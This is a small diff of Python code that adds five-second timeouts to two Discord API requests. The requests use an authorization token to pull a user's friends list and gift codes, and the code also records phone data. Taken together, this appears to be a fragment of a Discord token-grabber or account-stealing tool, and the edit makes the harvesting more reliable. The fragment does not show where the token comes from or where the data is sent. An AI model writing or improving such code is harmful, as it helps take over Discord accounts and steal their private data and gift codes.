@@ -98,7 +98,7 @@ try:
             phone_discord = "None"
 
         try:
-            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
+            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}, timeout=5).json()
             if friends:
                 friends_discord = []
                 for friend in friends:
@@ -120,7 +120,7 @@ try:
             friends_discord = "None"
 
         try:
-            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
+            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}, timeout=5).json()
             if gift_codes:
                 codes = []
                 for gift_codes_discord in gift_codes:
